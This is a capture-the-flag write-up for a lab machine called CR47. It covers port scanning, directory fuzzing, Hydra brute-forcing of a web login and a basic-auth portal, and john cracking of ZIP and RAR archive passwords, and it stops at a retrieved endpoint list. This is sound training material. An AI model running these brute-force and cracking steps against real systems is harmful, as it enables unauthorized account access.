# Official Write-Up for CR47

For this challenge, we will set up a local domain name called `cr47.cr` on our attacker machine that we will be pointing to the target IP.

To do the same just edit with `sudo` or as `root` the file `/etc/hosts` on your machine, by adding this line at the end of the file: `THE_IP_OF_CR47 cr47.cr`.

You can verify you're able to reach the machine through the custom domain name by doing: `ping cr47.cr`, if the server respond back, you should be good to go !

## Scanning / Enumerating the target

### Nmap

We first start by scanning our target like this:

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- cr47.cr       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-27 20:37 EDT
Nmap scan report for cr47.cr (192.168.67.197)
Host is up (0.00059s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE             VERSION
22/tcp   open  ssh                 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:38:b0:fd:53:17:ee:03:ae:da:09:c5:7e:2e:76:18 (ECDSA)
|_  256 3f:19:50:3b:3b:b3:3d:77:5f:9d:ad:50:03:31:0d:06 (ED25519)
443/tcp  open  ssl/http            Apache httpd 2.4.58
|_ssl-date: TLS randomness does not represent time
|_http-title: Welcome to Aeropuerto Internacional de Lim\xC3\xB3n
|_http-server-header: Apache/2.4.58 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=NoName/organizationName=Aeropuerto Internacional de Lim\xC3\x83\xC2\xB3n/stateOrProvinceName=Lim\xC3\x83\xC2\xB3n/countryName=CR
| Not valid before: 2024-09-26T21:18:07
|_Not valid after:  2034-09-24T21:18:07
4443/tcp open  ssl/pharos?
| ssl-cert: Subject: commonName=CR/organizationName=Rep\xC3\x83\xC2\xBAblica de Costa Rica/stateOrProvinceName=Lim\xC3\x83\xC2\xB3n/countryName=CR
| Not valid before: 2024-09-25T22:26:24
|_Not valid after:  2034-09-23T22:26:24
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 418 I'm a teapot
|     Server: [*] nmap says 'ssl/pharos?'... really? What a shame I can't tell you what I am :)
|     Date: Sat, 28 Sep 2024 00:37:19 GMT
|     Content-Length: 46
|     Content-Type: text/plain; charset=utf-8
|     You're definitely NOT welcome here friend!
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
8888/tcp open  ssl/sun-answerbook?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=*/organizationName=Dummy Certificate
| Subject Alternative Name: DNS:*, DNS:*.*
| Not valid before: 2024-09-28T00:27:48
|_Not valid after:  2025-09-28T00:27:48
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.4 Python/3.12.3
|     Date: Sat, 28 Sep 2024 00:37:24 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 8663
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>William the AI Chatbot :)</title>
|     <link rel="icon" href="/static/images/favicon.png" type="image/png">
|     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
|     <style>
|     body {
|     display: flex;
|     flex-direction: column;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     margin: 0;
|     background-color: #1e1e1e; /* Dark background for the whole page */
|     font-family: Arial, sans-serif;
|_    overflow: h
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
[RAW_OUTPUT_OF_4443_AND_8888]

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.75 seconds
```

Okay to summarize what we saw there:
1) `ssh` running on `22`
2) `ssl/http` running on `443`
3) `ssl/pharos?` on `4443` 
4) `ssl/sun-answerbook?` on `8888`

The 3rd and 4th port would have to be checked after we worked on `https`.

### Web / Gaining Foothold

Heading to the main page we don't see anything:

```html
┌──(kali㉿kali)-[~]
└─$ curl -k https://cr47.cr                                                   
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to Aeropuerto Internacional de Limón</title>
    <style>
        [CSS_CODE_HERE]
    </style>
    <link rel="icon" href="AdamAir_logo.png" type="image/png">
</head>
<body>
    <div class="overlay">
        <div class="container">
            <img src="limon_airport_logo.png" alt="Aeropuerto Internacional de Limón Logo" class="logo">
            <h1>Welcome to Aeropuerto Internacional de Limón</h1>
            <p>We are thrilled to have you here! We know you just arrived from Cape of Good Hope, ZA and that your trip was quite rough with all the storms...</p>
            <p>Rest assured, we aim to make your travel experience smooth and enjoyable here in our beautiful country !</p>
            <a href="answer.html" class="btn">GO BACK TO ADAMASTOR???</a>
        </div>
    </div>
</body>
</html>
```

Then clicking on the button at the center of the page, also don't give us anything...

```html
┌──(kali㉿kali)-[~]
└─$ curl -k https://cr47.cr/answer.html
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>THE ANSWER IS NO</title>
    <link rel="icon" href="AdamAir_logo.png" type="image/png">
    <style>
        [CSS_CODE_HERE]
    </style>
</head>
<body>
    <div id="video-container">
        <video autoplay loop muted id="video-background">
            <source src="meme.mp4" type="video/mp4">
            Your browser does not support the video tag.
        </video>
    </div>
    <h1>Hell, No.</h1>
    <a href="/" class="btn">Get back to the <i><b>Rich Coast</b></i></a>
</body>
</html>
```

Okay nothing really. Let's try to fuzz other directories, maybe we'll find something

#### Fuzzing `443`

Let's use dirsearch to find other directories:

```
┌──(kali㉿kali)-[~]
└─$ dirsearch -u https://cr47.cr/ -r   
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/https_cr47.cr/__24-09-27_20-50-15.txt

Target: https://cr47.cr/

[20:50:15] Starting: 
[20:50:17] 403 -  273B  - /.ht_wsr.txt                                      
[20:50:17] 403 -  273B  - /.htaccess.bak1                                   
[20:50:17] 403 -  273B  - /.htaccess.orig
[20:50:17] 403 -  273B  - /.htaccess.save                                   
[20:50:17] 403 -  273B  - /.htaccess_orig                                   
[20:50:17] 403 -  273B  - /.htaccessBAK                                     
[20:50:17] 403 -  273B  - /.htaccess_extra
[20:50:17] 403 -  273B  - /.htaccessOLD2
[20:50:17] 403 -  273B  - /.htaccess.sample                                 
[20:50:17] 403 -  273B  - /.html                                            
[20:50:17] 403 -  273B  - /.htm
[20:50:17] 403 -  273B  - /.htaccessOLD
[20:50:17] 403 -  273B  - /.htaccess_sc                                     
[20:50:17] 403 -  273B  - /.htpasswd_test                                   
[20:50:17] 403 -  273B  - /.htpasswds
[20:50:17] 403 -  273B  - /.httr-oauth
[20:50:17] 403 -  273B  - /.php                                             
[20:50:20] 301 -  305B  - /acceso  ->  https://cr47.cr/acceso/              
Added to the queue: acceso/
[20:50:35] 301 -  309B  - /javascript  ->  https://cr47.cr/javascript/      
Added to the queue: javascript/
[20:50:45] 403 -  273B  - /server-status/                                   
Added to the queue: server-status/
[20:50:45] 403 -  273B  - /server-status                                    
                                                                             
[20:50:53] Starting: acceso/
[20:50:54] 403 -  273B  - /acceso/.ht_wsr.txt                               
[20:50:54] 403 -  273B  - /acceso/.htaccess.orig                            
[20:50:54] 403 -  273B  - /acceso/.htaccess.bak1
[20:50:54] 403 -  273B  - /acceso/.htaccess.sample                          
[20:50:54] 403 -  273B  - /acceso/.htaccess_extra                           
[20:50:54] 403 -  273B  - /acceso/.htaccessBAK
[20:50:54] 403 -  273B  - /acceso/.htaccess_sc
[20:50:54] 403 -  273B  - /acceso/.htaccess.save                            
[20:50:54] 403 -  273B  - /acceso/.htaccess_orig                            
[20:50:54] 403 -  273B  - /acceso/.htaccessOLD
[20:50:54] 403 -  273B  - /acceso/.htm
[20:50:54] 403 -  273B  - /acceso/.htaccessOLD2                             
[20:50:54] 403 -  273B  - /acceso/.html                                     
[20:50:54] 403 -  273B  - /acceso/.httr-oauth                               
[20:50:54] 403 -  273B  - /acceso/.htpasswd_test                            
[20:50:54] 403 -  273B  - /acceso/.htpasswds
[20:50:55] 403 -  273B  - /acceso/.php                                      
[20:51:02] 200 -  508B  - /acceso/administracion.php                        
[20:51:08] 302 -    0B  - /acceso/download.php  ->  /acceso/                
[20:51:19] 302 -    0B  - /acceso/panel.php  ->  administracion.php         
                                                                             
[20:51:34] Starting: javascript/                                                                                                                                                                                                           
                                                                             
[20:52:16] Starting: server-status/                                                                                                                                                                                                        
[20:52:16] 404 -  270B  - /server-status/%2e%2e//google.com                 
                                                                             
Task Completed
```

Interesting, it seems we found two new places, `https://cr47.cr/acceso/` and `https://cr47.cr/acceso/administracion.php`. 

Let's first head to our first new url:

```html
┌──(kali㉿kali)-[~]
└─$ curl -k https://cr47.cr/acceso/    
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>As of now, 3 versions of BF</title>
  <link rel="icon" href="../AdamAir_logo.png" type="image/png">
  <style>
    [CSS_CODE_HERE]
  </style>
</head>
<body>
  <div class="container">
    <div class="text">++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>+++.<++.>>+++++++++++++++++++.----------------------.++++++++++++++++++.<<.>>-------.-----------.+++++++++++++++++++++++++.-.<<++++++++++++.------------.>>-----.------------.+.++++++++++.<<.>>++++.----------------------.++++++++++++++++++.<<.>>.++.-----..-.++++.--------------.-.<<.>>++++++++++++++++.-----.<<.>>-------------.+++.<<.>>----.<<.>>++++++.--.+++++++++.---------.+++++++++++++.---------.------.<<.>------.>++++++++++++.++++.+.-------------------.<<.>+++++++++++++++.>++++++++.------.--.<<.>>++++++++++++++++++++++.------------------.---.+++++++++++++++++.----------.+++++++++++.---------------.<<.>>---.+++++++++++++++++++.-.<<.>>-------.--------.+++.<<++++++++++++++.--------------.>----------.>+++++++.+.-----------.<<.>>++++++++++++++++++++.----------.++++++.<<+++++++.>>---------..<<-------.>>------.+++.+++++.----------.<<.>>---.+++++++++++..<<.>>++++++++.------------.---.<<.>>++++++++++++++.--------------.--.+++++++++++++++.-------------.+++++++++++++++.-.<<.>>++++++.----------.++++++.<<.>>-------.---------..-.<<++++++++++++.------------.>>++++++++++++++++.-----------.++++.--------.<<.>>+++++++++++++++.-----.<<.>>-------.+++++++++++++.-------.++++++.<<++++++++++++++...</div>
    <div class="tornado"></div>
  </div>

  <script>
    // Add event listener for mousemove to change background color
    document.addEventListener('mousemove', function(event) {
      const x = Math.round((event.clientX / window.innerWidth) * 255);
      const y = Math.round((event.clientY / window.innerHeight) * 255);
      document.body.style.backgroundColor = 'rgb(' + x + ',' + y + ',100)';
    });
  </script>

</body>
</html>
```

Interesting it seems we're having some `brainfuck` code in the `html`, let's try to see what it means...

```python
┌──(kali㉿kali)-[~]
└─$ cat code.bf 
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>+++.<++.>>+++++++++++++++++++.----------------------.++++++++++++++++++.<<.>>-------.-----------.+++++++++++++++++++++++++.-.<<++++++++++++.------------.>>-----.------------.+.++++++++++.<<.>>++++.----------------------.++++++++++++++++++.<<.>>.++.-----..-.++++.--------------.-.<<.>>++++++++++++++++.-----.<<.>>-------------.+++.<<.>>----.<<.>>++++++.--.+++++++++.---------.+++++++++++++.---------.------.<<.>------.>++++++++++++.++++.+.-------------------.<<.>+++++++++++++++.>++++++++.------.--.<<.>>++++++++++++++++++++++.------------------.---.+++++++++++++++++.----------.+++++++++++.---------------.<<.>>---.+++++++++++++++++++.-.<<.>>-------.--------.+++.<<++++++++++++++.--------------.>----------.>+++++++.+.-----------.<<.>>++++++++++++++++++++.----------.++++++.<<+++++++.>>---------..<<-------.>>------.+++.+++++.----------.<<.>>---.+++++++++++..<<.>>++++++++.------------.---.<<.>>++++++++++++++.--------------.--.+++++++++++++++.-------------.+++++++++++++++.-.<<.>>++++++.----------.++++++.<<.>>-------.---------..-.<<++++++++++++.------------.>>++++++++++++++++.-----------.++++.--------.<<.>>+++++++++++++++.-----.<<.>>-------.+++++++++++++.-------.++++++.<<++++++++++++++...
                                                                                                            
┌──(kali㉿kali)-[~]
└─$ cat brainfuck.py          
import sys

def brainfuck(code):
    tape = [0] * 30000
    p = 0
    output = ""
    i = 0

    while i < len(code):
        c = code[i]
        if c == ">":
            p += 1
        elif c == "<":
            p -= 1
        elif c == "+":
            tape[p] = (tape[p] + 1) % 256
        elif c == "-":
            tape[p] = (tape[p] - 1) % 256
        elif c == ".":
            output += chr(tape[p])
        elif c == ",":
            tape[p] = ord(sys.stdin.read(1))
        elif c == "[":
            if not tape[p]:
                i = code.find("]", i)
        elif c == "]":
            if tape[p]:
                i = code.rfind("[", 0, i)

        i += 1

    return output

if __name__ == "__main__":
    with open("code.bf", "r") as f:
        code = f.read()
    print(brainfuck(code))
                                                                                                            
┌──(kali㉿kali)-[~]
└─$ python3 brainfuck.py 
I was lazy, this was supposed to be a generic Costa Rica website but meh. Hope you'll find all the secrets you need, time to hunt...
```

Okay nothing really, time to check next url I guess, checking `https://cr47.cr/acceso/administracion.php` gave us that:

```html                                                                                               
┌──(kali㉿kali)-[~]
└─$ curl -k https://cr47.cr/acceso/administracion.php

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DIS - UdO</title>
    <link rel="icon" type="image/x-icon" href="Escudo_DIS.png">
    <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="container">
    <div class="login-box">
        <!--"Deberíamos ocultar el encabezado de abajo - Santiago Carrillo"-->
        <h2>DIS - Sistema de Unidad de Operaciones</h2>
        <form method="post" action="/acceso/administracion.php">
            <div class="textbox">
                <input type="text" name="username" id="username" required>
                <label for="username">Nombre de usuario</label>
            </div>
            <div class="textbox">
                <input type="password" name="password" id="password" required>
                <label for="password">Contraseña</label>
            </div>
            <button type="submit" class="btn">Acceso</button>
        </form>
            </div>
</div>

</body>
</html>
```

Multiple things to note here, it seems to be a hidden portal owned by the government of Costa Rica ? In the login code we see an html comment: `Deberíamos ocultar el encabezado de abajo - Santiago Carrillo` which roughly translate to: `We should hide the header below - Santiago Carrillo`.

The `header` Santiago is talking about is this line just below: `<h2>DIS - Sistema de Unidad de Operaciones</h2>`.

When googling about the header, we ended up on a wikipedia page [here](https://es.wikipedia.org/wiki/Direcci%C3%B3n_de_Inteligencia_y_Seguridad).

It seems `DIS` stand for `Dirección de Inteligencia y Seguridad`, `Unidad de Operaciones` being one of the unit of this intelligence agency. We probably just found one of their system !!

We also have an additional information, a name, `Santiago Carrillo`, he might be a government employee. Since we're facing a login page, maybe we could try to use his full name to find a username and maybe find a password through a dictionnary attack!

#### Getting through `administracion.php`

After trying different username format, we end up finding a valid pair of credential with `santiago.carrillo` as the username:

(Side note: This username format can be found by seeing that using `santiago.carrillo` for our requests gave us a longer response time then a faulty username)

```bash
┌──(kali㉿kali)-[~]
└─$ hydra -l santiago.carrillo -P /usr/share/wordlists/rockyou.txt cr47.cr https-post-form "/acceso/administracion.php:username=^USER^&password=^PASS^:S=302" -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-27 21:06:07
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-post-forms://cr47.cr:443/acceso/administracion.php:username=^USER^&password=^PASS^:S=302
[STATUS] 1831.00 tries/min, 1831 tries in 00:01h, 14342568 to do in 130:34h, 64 active
[STATUS] 1864.00 tries/min, 5592 tries in 00:03h, 14338807 to do in 128:13h, 64 active
[STATUS] 1857.71 tries/min, 13004 tries in 00:07h, 14331395 to do in 128:35h, 64 active
[STATUS] 1829.13 tries/min, 27437 tries in 00:15h, 14316962 to do in 130:28h, 64 active
[443][http-post-form] host: cr47.cr   login: santiago.carrillo   password: PURPLE1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-27 21:21:14
```

Let's log in to the portal and see what we found there

#### Navigating through `panel.php`

Logging in to `administracion.php` redirects us to `panel.php` on there we found this page:

```html
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/x-icon" href="Escudo_DIS.png">
    <title>DIS - UdO</title>
    <style>
        [CSS_CODE_HERE]
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome to the Dashboard</h1>
        <table>
            <tr>
                <th>Ticket Number</th>
                <th>Description</th>
                <th>Technician Response</th>
                <th>Attachments</th>
                <th>Status</th>
            </tr>
                        <tr>
                <td>001</td>
                <td>[*] Players progressing through cr47...</td>
                <td>Waiting for completion :)</td>
                <td>
                                            N/A
                                    </td>
                <td>
                    <span class="status status-pending">
                        Pending                    </span>
                </td>
            </tr>
                        <tr>
                <td>002</td>
                <td>New File Management System</td>
                <td>Made last update, please review new file and instruct on next steps.</td>
                <td>
                                            <a href="download.php?filename=dec7d0ab8aae309ab949cca7974a34d2.txt" download class="attachment">Download</a>
                                    </td>
                <td>
                    <span class="status status-in-progress">
                        In Progress                    </span>
                </td>
            </tr>
                        <tr>
                <td>003</td>
                <td>Broken access control vulnerability.</td>
                <td>Got it fixed just now, please see the attached file for more details.</td>
                <td>
                                            <a href="download.php?filename=a3229c43fddcefaed7db9b3410bb90e2.txt" download class="attachment">Download</a>
                                    </td>
                <td>
                    <span class="status status-closed">
                        Closed                    </span>
                </td>
            </tr>
                    </table>
        <a href="cerrar_sesion.php">Cerrar sesión</a>
    </div>
</body>
</html>
```

We can note multiple things:

- `panel.php` seems to be a dashboard that list current technician tickets on the system
- The first one seems to let us know that we're being awaited somehow, nice welcome message :)
- The two other tickets seems to have attachements, we learn about two things:
    - `New File Management System` seems to be an internal project, we have an attachement and the technician is waiting for the next step
    - `Broken access control vulnerability`, it seems the technician just fixed this vulnerability and let us know we can check the attached file.

Let's download these two files.

#### Cracking `New File Management System` attached file (`dec7d0ab8aae309ab949cca7974a34d2.txt`)

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ cat dec7d0ab8aae309ab949cca7974a34d2.txt                                 
UEsDBBQACQAIABqX51jOcF6YDAEAAHIBAAAXABwAb3JpZ2luYWxfZmlyc3Rfbm90ZS50eHRVVAkAAzMdi2YyHYtmdXgLAAEE6AMAAAToAwAAIIBUSsIjszCeSCqMCpSXsmgA+LG4Nct4ih5IHn/3J05YCxZDZfe7nI1LCzk9ssD53Ogo5UdVwZ7SF7m/zlX2f9q/ZyQBCQjGcB1zU/VJ2AmsLEVntoizGg/UfBInwbhSRFrQHXQysiKKUSBg6yF7rZ2rP4S77B3vv+a7q6BhBjx+XinWczyd+45HFUMkpnBz+FWXd3m8VdnquI1Tjng+ikex33EJHRRoWA1jsg4c0QdzBmdnnXL0bx5YaJlk4FkVGJ0+AUD/v7tm6IlMfJxtpakP4PekHRLporwIJq6XtS1/VLA9k3BbNDwvZBeZtxCLakKU/XWZcfe6+xyITYbL5/bXG+/jhl/VLnPSZFBLBwjOcF6YDAEAAHIBAABQSwECHgMUAAkACAAal+dYznBemAwBAAByAQAAFwAYAAAAAAABAAAAtIEAAAAAb3JpZ2luYWxfZmlyc3Rfbm90ZS50eHRVVAUAAzMdi2Z1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBdAAAAbQEAAAAA                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ cat dec7d0ab8aae309ab949cca7974a34d2.txt | base64 -d > type_to_identify_1
                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ file type_to_identify_1                                                  
type_to_identify_1: Zip archive data, at least v2.0 to extract, compression method=deflate
                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ mv type_to_identify_1 file_to_unzip.zip                                
                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ unzip file_to_unzip.zip
Archive:  file_to_unzip.zip
[file_to_unzip.zip] original_first_note.txt password:                                                                                                             
┌──(kali㉿kali)-[~/Downloads]
└─$ zip2john file_to_unzip.zip > ziphash.txt
ver 2.0 efh 5455 efh 7875 file_to_unzip.zip/original_first_note.txt PKZIP Encr: TS_chk, cmplen=268, decmplen=370, crc=985E70CE ts=971A cs=971a type=8
                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
da45rk7night     (file_to_unzip.zip/original_first_note.txt)     
1g 0:00:00:00 DONE (2024-09-27 21:58) 1.612g/s 14269Kp/s 14269Kc/s 14269KC/s dacolts..d6UdwdjdtwvhF9Jg9J
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Perfect we just cracked `dec7d0ab8aae309ab949cca7974a34d2.txt`, the password for the zip file is `da45rk7night`

#### Cracking `Broken access control vulnerability` attached file (`a3229c43fddcefaed7db9b3410bb90e2.txt`)

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ cat a3229c43fddcefaed7db9b3410bb90e2.txt
UmFyIRoHAQCuSL0+IQQAAAEPJphRpP7e5RdrfJllalqgqlrDCC55BSvZ6k9a2bOF0d8sTaRGWs6D
rJZNTbWS95hgc1Z3ZEaTZTBMAPM5udNj+l7D+pRGq4rxHjgw/RYhKW0qu5mWeWZwYYsdoNh1YdqZ
41uRz3kJCcQLMWdYfH+GR5/tEoSoAP6JGxquwrExId/5UwPOC7muso9qInkC8P69mPJDByHDXsIc
tQ+DDyjHC4xZdYx/SESYNZrkGM7Ws8MHkDvN7XlY5nvj6SHGWH7vt9AfL56eNbXNcKFijpKlOSgB
nGG5ao+T6vHmldSh6RpI54SdoD2MTSKg1CDwBydyfaMDe1QZjINd0c7f7smtRpeNdMD8yTRntea2
GodBz8F77hLll4hKQpwJjoZmtpAWDPVkT8PBEUhu7siAzTm8WiEkv4YUfio2tyOpGHgNxcJMMEsM
mIxRg7b8Au6ERWF2zW/1i5VPLnOT0t5m/5aNacPxquT5NbOiDVvwR99RQ1/ddQDvKjh49T/6XrfM
/RwrvlMB3OqJXc4vAnfEtiJ/6Zqj4ZRPzNfOhX5DNYQy6+Ln+CPRTAeO9kII9WNJHM4oX6hJCeMY
6NPS5rRL6im4uZSAiN+TNTQjh6COpqM/ppWdQf9CaARTA+cPN3A=
                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ cat a3229c43fddcefaed7db9b3410bb90e2.txt | base64 -d > type_to_identify_2
                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ file type_to_identify_2                                                  
type_to_identify_2: RAR archive data, v5
                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ mv type_to_identify_2 file_to_unrar.rar                              
                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ unrar x file_to_unrar.rar              

UNRAR 7.01 freeware      Copyright (c) 1993-2024 Alexander Roshal

Enter password (will not be echoed) for file_to_unrar.rar: 

Program aborted
                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ rar2john file_to_unrar.rar > rarhash.txt
                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt rarhash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (RAR5 [PBKDF2-SHA256 128/128 AVX 4x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
noche            (file_to_unrar.rar)     
1g 0:00:02:22 DONE (2024-09-27 22:14) 0.006995g/s 672.0p/s 672.0c/s 672.0C/s oakhill..necronomicon          
Use the "--show" option to display all of the cracked passwords reliably                                    
Session completed.
```
We were also able to crack `a3229c43fddcefaed7db9b3410bb90e2.txt`, the password for the rar file is `noche`

Now that we found the password for both, let's open them up and check the content!

#### Checking the content of our attached files:

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ unzip file_to_unzip.zip
Archive:  file_to_unzip.zip
[file_to_unzip.zip] original_first_note.txt password: 
  inflating: original_first_note.txt  
                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ unrar x file_to_unrar.rar

UNRAR 7.01 freeware      Copyright (c) 1993-2024 Alexander Roshal

Enter password (will not be echoed) for file_to_unrar.rar: 


Extracting from file_to_unrar.rar

Extracting  original_second_note.txt                                  OK 
All OK
                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ cat original_first_note.txt            
Hello Alberto,

I'm thinking of changing the way our product is fetching the keys we're using on this server.

Please watch out ! I found that your api key was hardcoded on there... "7h1515d3f1n1731y4n4p1k3y" should never be written on a file, right ? :)

Let me know what I should do to make this more secure, it seems like a giant flaw in our new system :/

Alejandro
                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ cat original_second_note.txt 
Hello Alberto,

The "lista" of ideas we had for naming our endpoints was visible to the public (under 4p11d34s/), that's not good, never do that !!

Thankfully I got it fixed, I put a portal up there to prevent access by unauthenticated users.

Got it tested with my own account and it works perfectly ! 

Alejandro Cerdas
```

These two notes gave us some valuable intels:

- An API key: `7h1515d3f1n1731y4n4p1k3y`, associated probably with this `New File Management System`
- A list of potential endpoints (maybe linked to our API?) was hosted without any protection, sadly for us a portal was put at `4p11d34s/` to prevent access
- We got a new employee name, `Alejandro Cerdas`, maybe a potential new username to use somewhere ? (If we follow the format we found previously with Santiago, we might have a new username to try, like: `alejandro.cerdas`)
- We also have a weird highlight on the word "lista", maybe something to try later with this new portal `alejandro` is talking about

#### Breaching `4p11d34s/`

If we head to `https://cr47.cr/acceso/4p11d34s/`, we get a log in pop up. Probably the portal `Alejandro` was talking about. 

It will take quite some time (about 2 hours) but in the end you'll end up with a valid set of credential for `alejandro.cerdas`

We can find the valid Auhtorization header through `hydra` but keep in mind it will take about 2 hours!

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ hydra -l alejandro.cerdas -P /usr/share/wordlists/rockyou.txt cr47.cr https-get "/acceso/4p11d34s/:A=BASIC:F=401" -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-28 05:02:40
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-gets://cr47.cr:443/acceso/4p11d34s/:A=BASIC:F=401
[STATUS] 2163.00 tries/min, 2163 tries in 00:01h, 14342236 to do in 110:31h, 64 active
[STATUS] 2180.33 tries/min, 6541 tries in 00:03h, 14337858 to do in 109:36h, 64 active
[STATUS] 2183.29 tries/min, 15283 tries in 00:07h, 14329116 to do in 109:24h, 64 active
[STATUS] 2179.60 tries/min, 32694 tries in 00:15h, 14311705 to do in 109:27h, 64 active
[STATUS] 2185.48 tries/min, 67750 tries in 00:31h, 14276649 to do in 108:53h, 64 active
[STATUS] 2188.30 tries/min, 102850 tries in 00:47h, 14241549 to do in 108:29h, 64 active
[STATUS] 2189.83 tries/min, 137959 tries in 01:03h, 14206440 to do in 108:08h, 64 active
[STATUS] 2190.29 tries/min, 173033 tries in 01:19h, 14171366 to do in 107:51h, 64 active
[STATUS] 2191.15 tries/min, 208159 tries in 01:35h, 14136240 to do in 107:32h, 64 active
[STATUS] 2191.29 tries/min, 243233 tries in 01:51h, 14101166 to do in 107:16h, 64 active
[STATUS] 2191.43 tries/min, 278312 tries in 02:07h, 14066087 to do in 106:59h, 64 active
[443][http-get] host: cr47.cr   login: alejandro.cerdas   password: lista
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-28 07:20:33
```

But that still tend to be a bit long...

Another faster, easier option is to trust our guts, the `original_second_note.txt` was putting in quotes the word `lista`, it ends up being the password, it doesn't have to be always complicated lol...

#### Gaining access to the `lista`

Now that we found a valid set of credential, we can use it to pull this data from the server through `curl`: 

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -k -u alejandro.cerdas:lista -o lista.txt https://cr47.cr/acceso/4p11d34s/
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1406  100  1406    0     0  25143      0 --:--:-- --:--:-- --:--:-- 25563
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ cat lista.txt                                                                  
4p1
upl04d3r
ch3cksum
d0wnl04d3r
3x3cut10n
d3str0y
4ppr0v3
r3ad
wr1t3
upl04d
upl04d_c0nf1g
ch3ck_l0g
d0wnl04d_b1n
3x3cut3_sh3ll
d3l3t3_f1l3
4ppr0v3_r3qu3st
d3ny_r3qu3st
upl04d_c3rt
ch3ck_c4ch3
d3l3t3_c4ch3
d0wnl04d_r3p0
upl04d_r3p0
